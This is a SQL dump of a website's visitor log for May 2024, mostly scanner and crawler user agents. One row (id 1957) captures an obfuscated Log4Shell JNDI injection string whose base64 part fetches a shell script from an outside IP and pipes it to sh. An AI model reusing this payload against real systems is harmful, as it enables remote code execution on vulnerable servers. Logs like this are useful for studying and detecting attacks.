INSERT INTO `g5_visit` VALUES ('1834', '35.203.211.229', '2024-05-06', '20:16:54', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1835', '119.28.118.146', '2024-05-06', '20:48:57', '', 'Python-urllib/3.10', '', '', '');
INSERT INTO `g5_visit` VALUES ('1836', '64.62.156.52', '2024-05-06', '21:01:29', '', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1837', '71.6.232.20', '2024-05-06', '21:41:04', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1838', '35.205.205.158', '2024-05-06', '22:54:31', '', 'python-requests/2.31.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1839', '41.80.117.105', '2024-05-07', '00:27:36', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7', '', '', '');
INSERT INTO `g5_visit` VALUES ('1840', '193.233.161.134', '2024-05-07', '02:11:44', '', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/120.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1841', '179.43.188.106', '2024-05-07', '03:30:13', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1842', '185.191.126.213', '2024-05-07', '04:09:57', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1843', '2.58.95.165', '2024-05-07', '05:03:44', '', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1844', '185.224.128.43', '2024-05-07', '05:14:54', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1845', '46.174.191.32', '2024-05-07', '05:40:49', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko', '', '', '');
INSERT INTO `g5_visit` VALUES ('1846', '66.240.236.109', '2024-05-07', '06:01:58', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1847', '205.210.31.23', '2024-05-07', '07:22:30', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1848', '185.16.38.111', '2024-05-07', '07:55:10', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1849', '146.19.24.28', '2024-05-07', '10:38:03', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1850', '60.191.125.35', '2024-05-07', '10:48:43', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1851', '65.49.20.67', '2024-05-07', '11:18:51', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1852', '34.77.126.178', '2024-05-07', '11:29:40', '', 'python-requests/2.31.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1853', '128.14.237.130', '2024-05-07', '11:38:29', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1854', '205.210.31.148', '2024-05-07', '14:47:44', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1855', '167.71.187.242', '2024-05-07', '16:18:45', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1856', '162.216.149.38', '2024-05-07', '17:01:48', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1857', '198.74.56.46', '2024-05-07', '17:36:57', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1858', '45.79.128.205', '2024-05-07', '17:37:59', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1859', '205.210.31.92', '2024-05-07', '18:39:42', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1860', '192.241.239.4', '2024-05-07', '18:59:36', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1861', '87.236.176.29', '2024-05-07', '20:11:07', '', 'Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)', '', '', '');
INSERT INTO `g5_visit` VALUES ('1862', '167.94.146.52', '2024-05-07', '20:27:27', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1863', '162.216.150.63', '2024-05-07', '21:20:29', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1864', '205.210.31.204', '2024-05-07', '21:21:36', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1865', '185.180.143.71', '2024-05-07', '23:12:34', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1866', '146.19.24.28', '2024-05-08', '00:20:25', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1867', '185.224.128.43', '2024-05-08', '01:57:47', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1868', '179.43.188.106', '2024-05-08', '02:29:16', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1869', '205.210.31.146', '2024-05-08', '03:22:19', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1870', '94.43.58.158', '2024-05-08', '03:33:58', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1871', '185.16.38.111', '2024-05-08', '04:20:26', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1872', '185.191.126.213', '2024-05-08', '04:22:40', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1873', '159.203.172.66', '2024-05-08', '05:02:58', '', 'Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1874', '185.242.226.10', '2024-05-08', '05:21:07', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1875', '205.210.31.23', '2024-05-08', '06:55:43', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1876', '117.243.247.5', '2024-05-08', '06:58:32', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1877', '35.203.211.179', '2024-05-08', '07:43:57', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1878', '131.100.23.112', '2024-05-08', '08:21:33', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1879', '198.235.24.115', '2024-05-08', '08:44:53', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1880', '45.156.129.57', '2024-05-08', '09:40:30', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1881', '144.126.201.127', '2024-05-08', '10:25:26', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1882', '162.216.149.30', '2024-05-08', '12:11:26', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1883', '170.64.130.197', '2024-05-08', '12:24:24', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1884', '65.154.226.169', '2024-05-08', '12:46:13', '', 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1885', '193.106.29.125', '2024-05-08', '14:00:33', '', 'Mozilla/5.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1886', '164.52.0.94', '2024-05-08', '15:06:08', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1887', '34.79.162.186', '2024-05-08', '17:04:50', '', 'python-requests/2.31.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1888', '101.204.43.116', '2024-05-08', '17:45:06', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1889', '49.113.95.248', '2024-05-08', '17:45:33', '', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1890', '167.94.145.110', '2024-05-08', '18:30:34', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1891', '64.62.197.134', '2024-05-08', '18:34:39', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1892', '206.217.128.98', '2024-05-08', '19:31:09', '', 'Mozilla/5.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1893', '20.127.146.25', '2024-05-08', '19:53:06', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1894', '198.199.95.88', '2024-05-08', '20:38:48', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1895', '186.225.188.155', '2024-05-08', '21:30:11', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1896', '46.174.191.28', '2024-05-09', '00:52:25', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko', '', '', '');
INSERT INTO `g5_visit` VALUES ('1897', '118.123.105.92', '2024-05-09', '01:24:41', '', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1898', '23.90.165.44', '2024-05-09', '01:28:40', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1899', '164.52.25.202', '2024-05-09', '01:57:28', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1900', '103.78.215.62', '2024-05-09', '03:06:29', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1901', '128.14.173.117', '2024-05-09', '03:36:29', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1902', '151.235.202.100', '2024-05-09', '03:53:13', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1903', '185.224.128.43', '2024-05-09', '04:05:31', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1904', '205.210.31.29', '2024-05-09', '04:13:57', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1905', '34.76.158.233', '2024-05-09', '04:40:17', '', 'python-requests/2.31.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1906', '35.203.211.178', '2024-05-09', '05:58:56', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1907', '198.235.24.16', '2024-05-09', '06:38:46', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1908', '185.191.126.213', '2024-05-09', '08:04:08', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1909', '71.6.199.23', '2024-05-09', '09:05:38', '', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1910', '162.216.150.204', '2024-05-09', '09:32:29', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1911', '185.16.38.111', '2024-05-09', '10:13:52', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1912', '162.142.125.14', '2024-05-09', '11:01:51', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1913', '209.38.134.109', '2024-05-09', '12:06:33', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1914', '1.11.90.40', '2024-05-09', '12:56:36', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1915', '179.43.188.106', '2024-05-09', '13:57:45', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1916', '64.62.197.183', '2024-05-09', '15:53:22', '', 'Mozilla/5.0 (Windows NT 10.0; rv:125.0) Gecko/20100101 Firefox/125.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1917', '205.210.31.192', '2024-05-09', '16:58:05', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1918', '91.242.190.42', '2024-05-09', '18:13:28', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1919', '119.23.241.9', '2024-05-09', '18:21:54', '', 'python-requests/2.27.1', '', '', '');
INSERT INTO `g5_visit` VALUES ('1920', '167.94.146.62', '2024-05-09', '20:56:44', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1921', '161.35.20.208', '2024-05-10', '00:22:22', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1922', '185.224.128.43', '2024-05-10', '00:43:37', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1923', '78.110.72.207', '2024-05-10', '01:10:14', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1924', '45.128.232.213', '2024-05-10', '01:16:54', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15', '', '', '');
INSERT INTO `g5_visit` VALUES ('1925', '179.43.188.106', '2024-05-10', '01:39:07', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1926', '198.199.107.20', '2024-05-10', '01:39:49', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1927', '164.52.25.202', '2024-05-10', '01:52:34', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1928', '185.191.126.213', '2024-05-10', '02:30:53', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1929', '117.233.223.62', '2024-05-10', '04:40:58', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1930', '130.43.117.82', '2024-05-10', '05:28:38', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1931', '185.242.226.10', '2024-05-10', '07:50:00', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1932', '185.16.38.111', '2024-05-10', '07:56:27', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1933', '87.246.7.62', '2024-05-10', '10:36:48', '', 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)', '', '', '');
INSERT INTO `g5_visit` VALUES ('1934', '205.210.31.30', '2024-05-10', '11:23:41', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1935', '46.174.191.29', '2024-05-10', '13:07:43', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko', '', '', '');
INSERT INTO `g5_visit` VALUES ('1936', '193.106.29.125', '2024-05-10', '14:00:51', '', 'Mozilla/5.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1937', '103.111.187.34', '2024-05-10', '14:17:18', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1938', '205.210.31.9', '2024-05-10', '14:45:54', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1939', '104.199.31.214', '2024-05-10', '15:20:04', '', 'python-requests/2.31.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1940', '162.216.149.11', '2024-05-10', '16:06:56', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1941', '87.236.176.71', '2024-05-10', '16:10:47', '', 'Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)', '', '', '');
INSERT INTO `g5_visit` VALUES ('1942', '64.62.197.76', '2024-05-10', '16:18:33', '', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1943', '34.77.126.178', '2024-05-10', '16:51:11', '', 'python-requests/2.31.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1944', '83.144.67.226', '2024-05-10', '18:27:51', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1945', '212.71.247.123', '2024-05-10', '19:49:01', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1946', '45.156.129.48', '2024-05-10', '21:45:43', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1947', '185.180.143.71', '2024-05-10', '21:57:38', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1948', '89.190.156.248', '2024-05-10', '23:17:22', '', 'ivre-masscan/1.3 https://github.com/robertdavidgraham/', '', '', '');
INSERT INTO `g5_visit` VALUES ('1949', '35.203.210.210', '2024-05-11', '00:01:27', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1950', '185.196.11.177', '2024-05-11', '00:10:48', '', 'Linux Gnu (cow)', '', '', '');
INSERT INTO `g5_visit` VALUES ('1951', '205.210.31.135', '2024-05-11', '02:19:15', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1952', '198.199.111.155', '2024-05-11', '02:37:03', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1953', '185.224.128.43', '2024-05-11', '02:42:52', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1954', '185.16.38.111', '2024-05-11', '03:05:19', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1955', '46.174.191.31', '2024-05-11', '03:35:04', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko', '', '', '');
INSERT INTO `g5_visit` VALUES ('1956', '190.96.1.233', '2024-05-11', '04:19:08', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7', '', '', '');
INSERT INTO `g5_visit` VALUES ('1957', '92.118.39.120', '2024-05-11', '04:29:50', 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//45.141.85.179:2411/TomcatBypass/Command/Base64/d2dldCAtTy0gaHR0cDovLzQ1LjE0MS44NS4xNzkvbGkuc2ggfCBzaDsgY3VybCBodHRwOi8vNDUuMTQxLjg1LjE3OS9saS5zaCB8IHNo}\')', 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//45.141.85.179:2411/TomcatBypass/Command/Base64/d2dldCAtTy0gaHR0cDovLzQ1LjE0MS44NS4xNzkvbGkuc2ggfCBzaDsgY3VybCBodHRwOi8vNDUuMTQxLjg1LjE3', '', '', '');
INSERT INTO `g5_visit` VALUES ('1958', '151.242.149.180', '2024-05-11', '04:52:44', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1959', '179.43.188.106', '2024-05-11', '05:35:00', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1960', '205.210.31.130', '2024-05-11', '07:01:04', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1961', '205.210.31.237', '2024-05-11', '10:21:01', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1962', '101.36.124.220', '2024-05-11', '10:26:27', '', 'curl/7.29.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1963', '101.36.127.85', '2024-05-11', '10:30:33', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 9_0_1) AppleWebKit/552.45 (KHTML, like Gecko) Chrome/74.0.2529 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1964', '167.94.138.114', '2024-05-11', '11:11:01', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1965', '64.62.197.179', '2024-05-11', '13:04:44', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.41', '', '', '');
INSERT INTO `g5_visit` VALUES ('1966', '103.203.57.1', '2024-05-11', '13:08:36', '', 'HTTP Banner Detection (https://security.ipip.net)', '', '', '');
INSERT INTO `g5_visit` VALUES ('1967', '167.248.133.187', '2024-05-11', '13:51:31', '', 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)', '', '', '');
INSERT INTO `g5_visit` VALUES ('1968', '185.191.126.213', '2024-05-11', '13:59:22', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1969', '198.235.24.135', '2024-05-11', '16:47:21', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1970', '34.22.208.68', '2024-05-11', '20:13:15', '', 'python-requests/2.31.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1971', '61.0.102.182', '2024-05-11', '20:43:10', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7', '', '', '');
